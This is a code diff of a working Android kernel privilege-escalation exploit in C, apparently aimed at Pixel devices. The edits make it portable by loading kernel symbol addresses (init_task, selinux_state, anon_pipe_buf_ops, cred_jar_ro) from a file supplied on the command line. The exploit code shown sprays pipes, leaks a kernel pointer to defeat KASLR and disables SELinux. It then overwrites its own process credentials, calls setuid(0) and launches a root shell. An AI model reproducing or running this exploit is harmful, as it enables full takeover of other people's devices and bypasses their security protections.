@@ -42,13 +42,7 @@
 #define MAX_PIPE_NUM 0x400
 #define MAX_256_PIPE 0x400
 #define FIRST_PIPE_SPRAY 0x200
-#define SECOND_PIPE_SPRAY (MAX_256_PIPE - FIRST_PIPE_SPRAY)
-
 #define PIPE_PAGE_NUM 0x600
-#define IOVEC_ARRAY_SZ 0x100
-#define SPRAY_SIZE 256
-#define SPRAY_CODE 0xff11
-#define CHECK_CODE 0xff22
 #define CPU 0
 
 // i realized using assert in AARCH64 causing a lot of bugs...
@@ -63,6 +57,12 @@ int pipes[MAX_PIPE_NUM][2];
 int pipe_pages[PIPE_PAGE_NUM][2];
 void *global_data;
 void *global_buffer;
+
+// some symbols
+unsigned long init_task;
+unsigned long selinux_state;
+unsigned long anon_pipe_buf_ops;
+unsigned long cred_jar_ro;
 
 int child_pid;
 int signal_pipes[2];
@@ -866,7 +866,6 @@ void exploit(void) {
   while (count) {
     usleep(10);
     int res = read(sync_pipes[0], global_buffer, count);
-    printf("read res : %d\n", res);
     count -= res;
   }
   // printf("first part spray done\n");
@@ -909,7 +908,6 @@ void exploit(void) {
   read(signal_pipes[0], data, 1);
   assert(data[0] == 'S');
   // sleep for a while making sure the memory is freed
-  printf("child exited\n");
   usleep(100 * 1000);
 
   printf("[*] STAGE 3: free the cache\n");
@@ -940,7 +938,7 @@ void exploit(void) {
   getchar();
 #endif
 
-  printf("[*] STAGE 4: reclaim the page\n");
+  printf("[*] STAGE 4: reclaim the cache\n");
   memset(global_buffer, 'A', 0x1000);
   for (int i = 0; i < PIPE_PAGE_NUM; i++) {
     write(pipe_pages[i][1], global_buffer, 0x1000);
@@ -973,7 +971,6 @@ void exploit(void) {
         pipe_buffer = recv_buffer + j;
         DumpHex(pipe_buffer, 0x30);
         memcpy(global_data + 0x80, pipe_buffer, 40);
-        printf("index %d, address at %p\n", j, pipe_buffer);
         exp_pipe_idx = i;
         exp_pipes[2] = pipe_pages[i][0];
         exp_pipes[3] = pipe_pages[i][1];
@@ -990,11 +987,7 @@ void exploit(void) {
     getchar();
   }
 
-  printf("done\n");
   write_file("/proc/self/comm", "expp");
-  unsigned long init_task;
-  unsigned long init_cred;
-  unsigned long selinux_state;
   unsigned long page = pipe_buffer[0];
   // pixel 6
   // ffffffdc0bfcbec0 init_task
@@ -1012,15 +1005,13 @@ void exploit(void) {
   printf("page addr is %lx\n", page_address(page));
   printf("leaked ops at %lx\n", pipe_buffer[2]);
 
-  unsigned long kaslr_offset = pipe_buffer[2] - 0xffffffc0119e8de8;
+  unsigned long kaslr_offset = pipe_buffer[2] - anon_pipe_buf_ops;
 
-  init_task = kaslr_offset + 0xffffffc011e4dd40;
-  init_cred = kaslr_offset + 0xffffffc011c76020;
-  selinux_state = kaslr_offset + 0xffffffc01220f820;
+  init_task += kaslr_offset;
+  selinux_state += kaslr_offset;
 
   printf("guessed kaslr offset is %lx\n", kaslr_offset);
   printf("guessed init task at %lx\n", init_task);
-  printf("guessed init cred at %lx\n", init_cred);
   printf("guessed selinux_state at %lx\n", selinux_state);
   
 
@@ -1031,7 +1022,6 @@ void exploit(void) {
   printf("selinux disabled\n");
 
   unsigned long *mem = malloc(0x1000);
-  unsigned long cred_jar_ro;
   cred_jar_ro = kaslr_offset + 0xffffffc0122c4cd0;
 
   printf("looking for my process...\n");
@@ -1098,19 +1088,17 @@ void exploit(void) {
   write64(current_task+0x5c8, 0x0000000100000001);
 
   read_mem(current_task, mem, 0x1000);
-  printf("dumping current task...\n");
-
   printf("tgid is %x\n", *(int *)((char *)mem+0x5cc));
   printf("pid is %x\n", *(int *)((char *)mem+0x5c8));
 
-  write64(current_task+0x780, page_address(pipe_buffer[0]));
-  write64(current_task+0x780-8, page_address(pipe_buffer[0]));
+  write64(current_task+0x780, page_address(page));
+  write64(current_task+0x780-8, page_address(page));
 
   printf("cred is overwritten\n");
   setuid(0);
   seteuid(0);
 
-  printf("now we uid/gid: %d/%d\n", getuid(), getgid());
+  printf("now uid/gid: %d/%d\n", getuid(), getgid());
   system("/system/bin/sh");
 
   while (1) {
@@ -1133,9 +1121,43 @@ void signal_handler(int sig) {
   }
 }
 
-int parent_id;
+void get_symbols(char *path) {
+  FILE *fp = fopen(path, "r");
+  assert(fp != NULL);
+  char line[0x100];
+  while (fgets(line, sizeof(line), fp)) {
+    char addr[0x20] = "0x";
+    strncpy(addr+2, line, 0x10);
+    if (!strcmp(&line[19], "selinux_state\n")) {
+      selinux_state = strtoul(addr, NULL, 16);
+      printf("got 0x%lx for %s", selinux_state, &line[19]);
+    }
 
-int main() {
+    if (!strcmp(&line[19], "init_task\n")) {
+      init_task = strtoul(addr, NULL, 16);
+      printf("got 0x%lx for %s", init_task, &line[19]);
+    }
+
+    if (!strcmp(&line[19], "anon_pipe_buf_ops\n")) {
+      anon_pipe_buf_ops = strtoul(addr, NULL, 16);
+      printf("got 0x%lx for %s", anon_pipe_buf_ops, &line[19]);
+    }
+
+    if (!strcmp(&line[19], "cred_jar_ro\n")) {
+      cred_jar_ro = strtoul(addr, NULL, 16);
+      printf("got 0x%lx for %s", cred_jar_ro, &line[19]);
+    }
+    memset(line, 0, sizeof(line));
+  }
+}
+
+int main(int argc, char **argv) {
+  if (argc == 1) {
+    printf("usage: %s [symbol file]\n", argv[0]);
+    exit(0);
+  }
+  get_symbols(argv[1]);
+
   pin_on_cpu(CPU);
   adjust_rlimit();
   syscall(__NR_mmap, 0x20000000ul, 0x1000ul, 7ul, 0x32ul, -1, 0ul);
@@ -1161,9 +1183,7 @@ int main() {
     signal(SIGUSR1, signal_handler);
     read(signal_pipes[0], data, 1);
     assert(data[0] == 'S');
-    printf("triggering the bug\n");
     do_trigger();
-    printf("trigger done\n");
     kill(getppid(), SIGUSR2);
     exit(0);
   }
